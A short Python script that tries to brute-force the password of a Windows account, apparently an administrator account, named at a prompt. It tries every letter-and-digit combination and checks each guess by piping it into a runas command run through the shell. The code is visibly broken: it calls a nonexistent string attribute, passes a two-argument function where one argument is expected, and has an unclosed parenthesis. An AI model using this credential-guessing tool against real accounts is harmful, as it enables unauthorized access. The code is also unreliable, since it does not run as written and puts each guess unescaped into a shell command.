import itertools
import string
import subprocess
accname = input("wat da acc naem?")
def verify_password(admin_username, password):
    try:
        command = f'echo {password} | runas /user:{admin_username} "cmd /c whoami"'
        result = subprocess.run(command, shell=True, text=True, input=password, capture_output=True)
        return result.returncode == 0
    except subprocess.CalledProcessError:
        return False
def guess_password(maxlen, check):
    chars = string.ascii + string.digits
    attempts = 0
    for password_length in range(1, maxlen):
        for guess in itertools.product(chars, repeat=password_length):
            attempts += 1
            guess = ''.join(guess)
            if check(guess):
                return guess, attempts
            # uncomment to display attempts, though will be slower
            #print(guess, attempts)

def guess_check(guess):
    verify_password(accname, guess)

passw, guesses = guess_password(9, verify_password)
print(passw+" was found in "+str(guesses)+" tries"
